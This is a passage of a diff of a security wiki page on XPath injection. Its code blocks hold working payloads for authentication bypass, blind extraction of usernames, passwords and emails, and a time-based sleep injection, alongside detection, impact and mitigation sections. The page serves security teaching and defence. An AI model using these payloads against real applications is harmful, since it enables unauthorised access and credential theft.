+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span>&#39; or substring(name(/*),1,1)=&#39;r&#39; or &#39;1&#39;=&#39;2
+</span></span><span style="display:flex;"><span>&#39; or string-length(name(/*))=4 or &#39;1&#39;=&#39;2</span></span></code></pre></div><h3 id="time-based-xpath-requires-app-using-xsltxpath-extension-functions">Time-based XPath (requires app using XSLT/XPath extension functions)<a class="anchor" href="#time-based-xpath-requires-app-using-xsltxpath-extension-functions">#</a></h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span>&#39; or java.lang.Thread.sleep(5000) or &#39;1&#39;=&#39;2</span></span></code></pre></div><hr>
+<h2 id="enumeration-examples">Enumeration Examples<a class="anchor" href="#enumeration-examples">#</a></h2>
+<h3 id="get-number-of-users">Get number of users<a class="anchor" href="#get-number-of-users">#</a></h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span>&#39; or count(//user)=1 or &#39;1&#39;=&#39;2</span></span></code></pre></div><h3 id="extract-number-of-child-nodes">Extract Number of Child Nodes<a class="anchor" href="#extract-number-of-child-nodes">#</a></h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span>name=&#39; or count(//user[position()=1]/child::node())=5  or &#39;1&#39;=&#39;1<span style="color:#960050;background-color:#1e0010">&amp;</span>pass=test</span></span></code></pre></div><h3 id="extract-number-of-characters">Extract number of characters<a class="anchor" href="#extract-number-of-characters">#</a></h3>
+<h3 id="extract-user-name-character-by-character">Extract user name character-by-character<a class="anchor" href="#extract-user-name-character-by-character">#</a></h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span>&#39; or substring(//user[1]/username/text(),1,1)=&#39;a&#39; or &#39;1&#39;=&#39;2
+</span></span><span style="display:flex;"><span>&#39; or substring(//user[1]/username/text(),2,1)=&#39;d&#39; or &#39;1&#39;=&#39;2</span></span></code></pre></div><h3 id="extract-password">Extract Password<a class="anchor" href="#extract-password">#</a></h3>
+<pre tabindex="0"><code>&#39; or substring(//user[1]/password/text(),1,1)=&#39;a&#39; or &#39;1&#39;=&#39;2</code></pre><hr>
+<h3 id="extract-email">Extract Email<a class="anchor" href="#extract-email">#</a></h3>
+<pre tabindex="0"><code>&#39; or substring(//user[1]/email/text(),1,1)=&#39;a&#39; or &#39;1&#39;=&#39;2</code></pre><hr>
+<h3 id="count-users">Count Users<a class="anchor" href="#count-users">#</a></h3>
+<pre tabindex="0"><code>&#39; or count(//user)=5 or &#39;1&#39;=&#39;2</code></pre><hr>
+<h2 id="xpath-injection-techniques-summary">XPath Injection Techniques Summary<a class="anchor" href="#xpath-injection-techniques-summary">#</a></h2>
 <table>
-<thead>
-<tr>
-<th>Technique</th>
-<th>Description</th>
-<th>Example</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>Boolean-based</td>
-<td>True/False responses</td>
-<td><code>' or 1=1 or 'a'='b</code></td>
-</tr>
-<tr>
-<td>Blind</td>
-<td>Infer info from output delay or structure</td>
-<td><code>' or substring(//user[1]/username,1,1)='a</code></td>
-</tr>
-<tr>
-<td>Error-based</td>
-<td>Parse error leakage (less common)</td>
-<td>Unbalanced quotes</td>
-</tr>
-<tr>
-<td>Time-based</td>
-<td>Delay via Java methods in XSLT</td>
-<td><code>' or java.lang.Thread.sleep(5000) or '1'='1</code></td>
-</tr>
-<tr>
-<td>Out-of-Band (OOB)</td>
-<td>Rare – with XXE or SSRF chaining</td>
-<td>Needs multi-vector chaining</td>
-</tr>
-</tbody>
+	<thead>
+			<tr>
+					<th>Technique</th>
+					<th>Description</th>
+					<th>Example</th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td>Boolean-based</td>
+					<td>True/False responses</td>
+					<td><code>' or 1=1 or 'a'='b</code></td>
+			</tr>
+			<tr>
+					<td>Blind</td>
+					<td>Infer info from output delay or structure</td>
+					<td><code>' or substring(//user[1]/username,1,1)='a</code></td>
+			</tr>
+			<tr>
+					<td>Error-based</td>
+					<td>Parse error leakage (less common)</td>
+					<td>Unbalanced quotes</td>
+			</tr>
+			<tr>
+					<td>Time-based</td>
+					<td>Delay via Java methods in XSLT</td>
+					<td><code>' or java.lang.Thread.sleep(5000) or '1'='1</code></td>
+			</tr>
+			<tr>
+					<td>Out-of-Band (OOB)</td>
+					<td>Rare – with XXE or SSRF chaining</td>
+					<td>Needs multi-vector chaining</td>
+			</tr>
+	</tbody>
 </table>
 <hr>
-<h2 id="realistic-bypass-scenario">
-  Realistic Bypass Scenario
-  <a class="anchor" href="#realistic-bypass-scenario">#</a>
-</h2>
-<h3 id="query">
-  Query:
-  <a class="anchor" href="#query">#</a>
-</h3>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span>/users/user[username/text()=&#39;[USER]&#39; and password/text()=&#39;[PASS]&#39;]
-</span></span></code></pre></div><h3 id="payload">
-  Payload:
-  <a class="anchor" href="#payload">#</a>
-</h3>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>Username: <span style="color:#e6db74">&#39; or &#39;</span>1<span style="color:#e6db74">&#39;=&#39;</span><span style="color:#ae81ff">1</span>
-</span></span><span style="display:flex;"><span>Password: anything
-</span></span></code></pre></div><h3 id="final-xpath-after-injection">
-  Final XPath after injection:
-  <a class="anchor" href="#final-xpath-after-injection">#</a>
-</h3>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span>/users/user[username/text()=&#39;&#39; or &#39;1&#39;=&#39;1&#39; and password/text()=&#39;anything&#39;]
-</span></span></code></pre></div><h3 id="waf--filter-bypass">
-  WAF &amp; Filter Bypass
-  <a class="anchor" href="#waf--filter-bypass">#</a>
-</h3>
+<h2 id="realistic-bypass-scenario">Realistic Bypass Scenario<a class="anchor" href="#realistic-bypass-scenario">#</a></h2>
+<h3 id="query">Query:<a class="anchor" href="#query">#</a></h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span>/users/user[username/text()=&#39;[USER]&#39; and password/text()=&#39;[PASS]&#39;]</span></span></code></pre></div><h3 id="payload">Payload:<a class="anchor" href="#payload">#</a></h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>Username: <span style="color:#e6db74">&#39; or &#39;</span>1<span style="color:#e6db74">&#39;=&#39;</span><span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>Password: anything</span></span></code></pre></div><h3 id="final-xpath-after-injection">Final XPath after injection:<a class="anchor" href="#final-xpath-after-injection">#</a></h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span>/users/user[username/text()=&#39;&#39; or &#39;1&#39;=&#39;1&#39; and password/text()=&#39;anything&#39;]</span></span></code></pre></div><h3 id="waf--filter-bypass">WAF &amp; Filter Bypass<a class="anchor" href="#waf--filter-bypass">#</a></h3>
 <ul>
 <li>Alternate quote styles</li>
 <li>Mixed casing</li>
@@ -1649,34 +1544,13 @@ https://github.com/alex-shpak/hugo-book
 <li>Splitting payloads across parameters</li>
 </ul>
 <hr>
-<h2 id="advanced-payloads-xpath-10">
-  Advanced Payloads (XPath 1.0)
-  <a class="anchor" href="#advanced-payloads-xpath-10">#</a>
-</h2>
-<h3 id="extract-xml-version">
-  Extract XML Version
-  <a class="anchor" href="#extract-xml-version">#</a>
-</h3>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span>&#39; or starts-with(system-property(&#39;xsl:version&#39;),&#39;1&#39;) or &#39;1&#39;=&#39;2
-</span></span></code></pre></div><h3 id="checking-existence-of-node">
-  Checking existence of node
-  <a class="anchor" href="#checking-existence-of-node">#</a>
-</h3>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span>&#39; or name(//user[1])=&#39;user&#39; or &#39;1&#39;=&#39;2
-</span></span></code></pre></div><h3 id="length-of-text">
-  Length of text
-  <a class="anchor" href="#length-of-text">#</a>
-</h3>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span>&#39; or string-length(//user[1]/username)=5 or &#39;1&#39;=&#39;2
-</span></span></code></pre></div><hr>
-<h2 id="framework-specific-scenarios">
-  Framework-Specific Scenarios
-  <a class="anchor" href="#framework-specific-scenarios">#</a>
-</h2>
-<h3 id="java">
-  Java
-  <a class="anchor" href="#java">#</a>
-</h3>
+<h2 id="advanced-payloads-xpath-10">Advanced Payloads (XPath 1.0)<a class="anchor" href="#advanced-payloads-xpath-10">#</a></h2>
+<h3 id="extract-xml-version">Extract XML Version<a class="anchor" href="#extract-xml-version">#</a></h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span>&#39; or starts-with(system-property(&#39;xsl:version&#39;),&#39;1&#39;) or &#39;1&#39;=&#39;2</span></span></code></pre></div><h3 id="checking-existence-of-node">Checking existence of node<a class="anchor" href="#checking-existence-of-node">#</a></h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span>&#39; or name(//user[1])=&#39;user&#39; or &#39;1&#39;=&#39;2</span></span></code></pre></div><h3 id="length-of-text">Length of text<a class="anchor" href="#length-of-text">#</a></h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span>&#39; or string-length(//user[1]/username)=5 or &#39;1&#39;=&#39;2</span></span></code></pre></div><hr>
+<h2 id="framework-specific-scenarios">Framework-Specific Scenarios<a class="anchor" href="#framework-specific-scenarios">#</a></h2>
+<h3 id="java">Java<a class="anchor" href="#java">#</a></h3>
 <p>Common APIs:</p>
 <ul>
 <li>XPathFactory</li>
@@ -1685,10 +1559,7 @@ https://github.com/alex-shpak/hugo-book
 <li>Saxon</li>
 </ul>
 <hr>
-<h3 id="net">
-  .NET
-  <a class="anchor" href="#net">#</a>
-</h3>
+<h3 id="net">.NET<a class="anchor" href="#net">#</a></h3>
 <p>Common APIs:</p>
 <ul>
 <li>XPathNavigator</li>
@@ -1696,30 +1567,21 @@ https://github.com/alex-shpak/hugo-book
 <li>XPathDocument</li>
 </ul>
 <hr>
-<h3 id="php">
-  PHP
-  <a class="anchor" href="#php">#</a>
-</h3>
+<h3 id="php">PHP<a class="anchor" href="#php">#</a></h3>
 <p>Common APIs:</p>
 <ul>
 <li>DOMXPath</li>
 <li>SimpleXML</li>
 </ul>
 <hr>
-<h3 id="python">
-  Python
-  <a class="anchor" href="#python">#</a>
-</h3>
+<h3 id="python">Python<a class="anchor" href="#python">#</a></h3>
 <p>Libraries:</p>
 <ul>
 <li>lxml</li>
 <li>ElementTree</li>
 </ul>
 <hr>
-<h3 id="javascript--nodejs">
-  JavaScript / Node.js
-  <a class="anchor" href="#javascript--nodejs">#</a>
-</h3>
+<h3 id="javascript--nodejs">JavaScript / Node.js<a class="anchor" href="#javascript--nodejs">#</a></h3>
 <p>Libraries:</p>
 <ul>
 <li>xpath</li>
@@ -1727,14 +1589,8 @@ https://github.com/alex-shpak/hugo-book
 <li>libxmljs</li>
 </ul>
 <hr>
-<h2 id="detection-techniques">
-  Detection Techniques
-  <a class="anchor" href="#detection-techniques">#</a>
-</h2>
-<h3 id="manual-detection">
-  Manual Detection
-  <a class="anchor" href="#manual-detection">#</a>
-</h3>
+<h2 id="detection-techniques">Detection Techniques<a class="anchor" href="#detection-techniques">#</a></h2>
+<h3 id="manual-detection">Manual Detection<a class="anchor" href="#manual-detection">#</a></h3>
 <ul>
 <li>Inject <code>'</code>, <code>&quot;</code>, <code>]</code>, <code>)</code>, <code>|</code>, , <code>@</code></li>
 <li>Test boolean conditions</li>
@@ -1745,21 +1601,9 @@ https://github.com/alex-shpak/hugo-book
 <li>Observe response length differences</li>
 <li>Monitor redirects and login behavior</li>
 </ul>
-<h4 id="useful-xpath-payloads">
-  Useful XPath Payloads
-  <a class="anchor" href="#useful-xpath-payloads">#</a>
-</h4>
-<pre tabindex="0"><code>&#39; or position()=1 or &#39;
-</code></pre><pre tabindex="0"><code>&#39; or last()=1 or &#39;
-</code></pre><pre tabindex="0"><code>&#39; or contains(name(/*),&#39;r&#39;) or &#39;
-</code></pre><pre tabindex="0"><code>&#39; or starts-with(name(/*),&#39;r&#39;) or &#39;
-</code></pre><pre tabindex="0"><code>&#39; or string-length(//user[1]/password)=8 or &#39;
-</code></pre><pre tabindex="0"><code>&#39; or substring(//user[1]/password,1,1)=&#39;a&#39; or &#39;
-</code></pre><hr>
-<h3 id="automated-detection">
-  Automated Detection
-  <a class="anchor" href="#automated-detection">#</a>
-</h3>
+<h4 id="useful-xpath-payloads">Useful XPath Payloads<a class="anchor" href="#useful-xpath-payloads">#</a></h4>
+<pre tabindex="0"><code>&#39; or position()=1 or &#39;</code></pre><pre tabindex="0"><code>&#39; or last()=1 or &#39;</code></pre><pre tabindex="0"><code>&#39; or contains(name(/*),&#39;r&#39;) or &#39;</code></pre><pre tabindex="0"><code>&#39; or starts-with(name(/*),&#39;r&#39;) or &#39;</code></pre><pre tabindex="0"><code>&#39; or string-length(//user[1]/password)=8 or &#39;</code></pre><pre tabindex="0"><code>&#39; or substring(//user[1]/password,1,1)=&#39;a&#39; or &#39;</code></pre><hr>
+<h3 id="automated-detection">Automated Detection<a class="anchor" href="#automated-detection">#</a></h3>
 <ul>
 <li>Burp Suite Scanner</li>
 <li>Burp Intruder</li>
@@ -1769,10 +1613,7 @@ https://github.com/alex-shpak/hugo-book
 <li>ffuf (parameter fuzzing)</li>
 </ul>
 <hr>
-<h2 id="impact">
-  Impact
-  <a class="anchor" href="#impact">#</a>
-</h2>
+<h2 id="impact">Impact<a class="anchor" href="#impact">#</a></h2>
 <p>Successful XPath Injection may result in:</p>
 <ul>
 <li>Authentication bypass</li>
@@ -1786,78 +1627,66 @@ https://github.com/alex-shpak/hugo-book
 <li>Chaining with XXE or SSRF in XML applications</li>
 </ul>
 <hr>
-<h2 id="mitigation-strategies">
-  Mitigation Strategies
-  <a class="anchor" href="#mitigation-strategies">#</a>
-</h2>
+<h2 id="mitigation-strategies">Mitigation Strategies<a class="anchor" href="#mitigation-strategies">#</a></h2>
 <table>
-<thead>
-<tr>
-<th>Strategy</th>
-<th>Details</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td><strong>Input Validation</strong></td>
-<td>Whitelist valid inputs, reject unexpected characters like <code>'</code>, <code>&quot;</code>, <code>&lt;</code>, <code>&gt;</code>, etc.</td>
-</tr>
-<tr>
-<td><strong>Use of XPath Parameterization</strong></td>
-<td>Use XPath APIs that support variables (e.g., <code>XPathExpression.setXPathVariableResolver()</code> in Java)</td>
-</tr>
-<tr>
-<td><strong>Avoid Concatenation</strong></td>
-<td>Never construct queries like <code>xpath = &quot;//user[username/text()='&quot; + user + &quot;']&quot;</code></td>
-</tr>
-<tr>
-<td><strong>Use JSON Instead of XML</strong></td>
-<td>JSON is less prone to XPathi</td>
-</tr>
-<tr>
-<td><strong>Proper Error Handling</strong></td>
-<td>Disable detailed XML errors and stack traces</td>
-</tr>
-</tbody>
+	<thead>
+			<tr>
+					<th>Strategy</th>
+					<th>Details</th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td><strong>Input Validation</strong></td>
+					<td>Whitelist valid inputs, reject unexpected characters like <code>'</code>, <code>&quot;</code>, <code>&lt;</code>, <code>&gt;</code>, etc.</td>
+			</tr>
+			<tr>
+					<td><strong>Use of XPath Parameterization</strong></td>
+					<td>Use XPath APIs that support variables (e.g., <code>XPathExpression.setXPathVariableResolver()</code> in Java)</td>
+			</tr>
+			<tr>
+					<td><strong>Avoid Concatenation</strong></td>
+					<td>Never construct queries like <code>xpath = &quot;//user[username/text()='&quot; + user + &quot;']&quot;</code></td>
+			</tr>
+			<tr>
+					<td><strong>Use JSON Instead of XML</strong></td>
+					<td>JSON is less prone to XPathi</td>
+			</tr>
+			<tr>
+					<td><strong>Proper Error Handling</strong></td>
+					<td>Disable detailed XML errors and stack traces</td>
+			</tr>
+	</tbody>
 </table>
 <hr>
-<h2 id="tools">
-  Tools
-  <a class="anchor" href="#tools">#</a>
-</h2>
+<h2 id="tools">Tools<a class="anchor" href="#tools">#</a></h2>
 <hr>
 <table>
-<thead>
-<tr>
-<th>Tool</th>
-<th>Purpose</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td><a href="https://github.com/orf/xcat" target="_blank" rel="noreferrer noopener nofollow">XCat</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></td>
-<td>command line tool</td>
-</tr>
-<tr>
-<td>Python + lxml</td>
-<td>Custom exploitation</td>
-</tr>
-<tr>
-<td>PayloadsAllTheThings</td>
-<td>Payload reference</td>
-</tr>
-</tbody>
+	<thead>
+			<tr>
+					<th>Tool</th>
+					<th>Purpose</th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td><a href="https://github.com/orf/xcat" target="_blank" rel="noreferrer noopener nofollow">XCat</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></td>
+					<td>command line tool</td>
+			</tr>
+			<tr>
+					<td>Python + lxml</td>
+					<td>Custom exploitation</td>
+			</tr>
+			<tr>
+					<td>PayloadsAllTheThings</td>
+					<td>Payload reference</td>
+			</tr>
+	</tbody>
 </table>
-<h2 id="good-to-read">
-  Good to Read:
-  <a class="anchor" href="#good-to-read">#</a>
-</h2>
+<h2 id="good-to-read">Good to Read:<a class="anchor" href="#good-to-read">#</a></h2>
 <p><a href="https://hackerone.com/reports/1626226" target="_blank" rel="noreferrer noopener nofollow">https://hackerone.com/reports/1626226</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></p>
 <p><a href="https://cyberbull.medium.com/xpath-injection-%EF%B8%8F-deep-dive-1213ad0dccb8" target="_blank" rel="noreferrer noopener nofollow">https://cyberbull.medium.com/xpath-injection-️-deep-dive-1213ad0dccb8</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></p>
-<h2 id="references">
-  References:
-  <a class="anchor" href="#references">#</a>
-</h2>
+<h2 id="references">References:<a class="anchor" href="#references">#</a></h2>
 <p><a href="https://medium.com/@cc0a/blind-xpath-injection-bool-df637d5e92f0" target="_blank" rel="noreferrer noopener nofollow">https://medium.com/@cc0a/blind-xpath-injection-bool-df637d5e92f0</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></p>
 <p><a href="https://www.imperva.com/learn/application-security/xpath-injection/" target="_blank" rel="noreferrer noopener nofollow">https://www.imperva.com/learn/application-security/xpath-injection/</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></p>
 <p><a href="https://zhangzeyu2001.medium.com/blind-xpath-injections-the-path-less-travelled-6f03ce5ec8f6" target="_blank" rel="noreferrer noopener nofollow">https://zhangzeyu2001.medium.com/blind-xpath-injections-the-path-less-travelled-6f03ce5ec8f6</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></p>
@@ -1879,49 +1708,62 @@ https://github.com/alex-shpak/hugo-book
         
   <div class="flex flex-wrap justify-between">
 
-
-  <div><a class="flex align-center" href="https://github.com/payatu/cybersec-wiki/commit/d2c880c4a57b9b433287f413f6e6111ca829ffdd" title='Last modified by banditSaurabh | August 5, 2026' target="_blank" rel="noopener">
-      <img src="/svg/calendar.svg" class="book-icon" alt="Calendar" />
-      <span>August 5, 2026</span>
-    </a>
-  </div>
-
-
-
-  <div>
-    <a class="flex align-center" href="https://github.com/payatu/cybersec-wiki/edit/main/content/docs/application-security/web/XPath%20Injection.md" target="_blank" rel="noopener">
-      <img src="/svg/edit.svg" class="book-icon" alt="Edit" />
-      <span>Edit this page</span>
-    </a>
-  </div>
-
+<div>
 
 </div>
 
+<div>
 
+</div>
 
-  <script>(function(){function e(e){const t=window.getSelection(),n=document.createRange();n.selectNodeContents(e),t.removeAllRanges(),t.addRange(n)}document.querySelectorAll("pre code").forEach(t=>{t.addEventListener("click",function(){e(t.parentElement),navigator.clipboard&&navigator.clipboard.writeText(t.parentElement.textContent)})})})()</script>
+</div>
 
+<div class="flex flex-wrap justify-between">
+    <span>
+    
+      <a href="/docs/application-security/web/Web-Cache-Poisoning/" class="flex align-center">
+        <img src="/icons/backward.svg" class="book-icon" alt="Backward" />
+        <span>Web Cache Poisoning</span>
+      </a>
+    
+    </span>
+    <span>
+    
+      <a href="/docs/application-security/web/XXE-XML-External-Entities/" class="flex align-center">
+        <span>XXE (XML External Entities)</span>
+        <img src="/icons/forward.svg" class="book-icon" alt="Forward" />
+      </a>
+    
+    </span>
+  </div>
 
  
         
-      </footer>
-
-      
   
   <div class="book-comments">
 
 </div>
   
  
+        
+        
+  
+ 
+        
+  
+    <script>(function(){document.querySelectorAll("pre:has(code)").forEach(e=>{e.addEventListener("click",e.focus),e.addEventListener("copy",function(t){if(t.preventDefault(),navigator.clipboard){const t=window.getSelection().toString()||e.textContent;navigator.clipboard.writeText(t)}})})})()</script>
+  
+
+      </footer>
 
       <label for="menu-control" class="hidden book-menu-overlay"></label>
     </div>
 
     
-    <aside class="book-toc">
-      <div class="book-toc-content">
-        
+  
+  <aside class="book-toc">
+    <div class="book-toc-content">
+      
   
 <nav id="TableOfContents">
   <ul>
@@ -2007,15 +1849,24 @@ https://github.com/alex-shpak/hugo-book
 </nav>
 
 
+
+    </div>
+  </aside>
+  
  
-      </div>
-    </aside>
-    
   </main>
 
   
 </body>
 </html>
+
+
+
+
+
+
+
+
 
 
 
